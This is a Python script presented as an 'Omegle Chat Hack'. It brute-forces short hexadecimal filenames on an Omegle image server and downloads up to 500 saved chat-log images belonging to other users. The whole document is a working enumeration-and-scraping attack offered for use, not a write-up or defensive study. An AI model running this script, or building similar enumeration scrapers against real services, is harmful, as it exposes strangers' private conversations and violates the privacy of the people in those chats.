
###########################################################################
# Omegle-Chat_hack														  
# Made by - Indrajeet Bhuyan (www.hackatrick.com)						  
#																		  
#																		  
# Version: 0.1
# Date:    07-08-2016 (dd-mm-yyyy)
#
# Version 0.2
# Date:     19-08-2016
#
# This tool downloads random chat logs which are saved in omegle's server.
###########################################################################


import itertools
import urllib.request
import os
from time import gmtime, strftime

print("\t\t----------Omegle Chat Hack----------\n")
f=str(0)

url="http://l.omegle.com/"
counter=0 # To enable start number functionality

print("Enter the number to start from:")
Fromnumber=int(input())
print("\nEnter the max number between ",Fromnumber+1, "to 500 :")
numberofImagesWanted=int(input())

#Max number is limited as per the tool creater's logic
if numberofImagesWanted > 500:
	print("\nMax number should not be greater than 500, thanks for checking the tool..\n")
	exit(0)

#Max number should be > than the Start number
if numberofImagesWanted <= Fromnumber:
	print("\nMax number should be greater than the start number")
	exit(0)

#Current local time to use as part of images folder name	
nowtime = strftime("%Y-%m-%d %H-%M-%S", gmtime())

# Storage folder name for the current run
path = "images " + nowtime

for j in range (Fromnumber,numberofImagesWanted):
	#print ("j: ",j,"\n")
	stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]
	for L in range(5, 10):
			#print("L: ",L,"\n")
			for i in itertools.combinations_with_replacement(stuff, L):
				#print("i: ",i,"\n")
				counter = counter + 1
				if(counter >= Fromnumber):
					finalurl = url + str(''.join(i))+ ".png"
					j=j+1
					if counter>=numberofImagesWanted+1 :
						exit(0)
					omRequest = urllib.request.Request(finalurl)
					#print(counter, ": ",finalurl);
					try :
						req = urllib.request.urlopen(omRequest)
						print("\n",finalurl, ": downloaded successfully \n")
						if not os.path.exists(path):
							os.makedirs(path)
						filename = os.path.join(path, str(''.join(i))+".png")
						output = open(filename,"wb")
						output.write(req.read())
						output.close()
					except  urllib.error.URLError as e:
						print("\n",finalurl, ":Unsuccessful..\n")
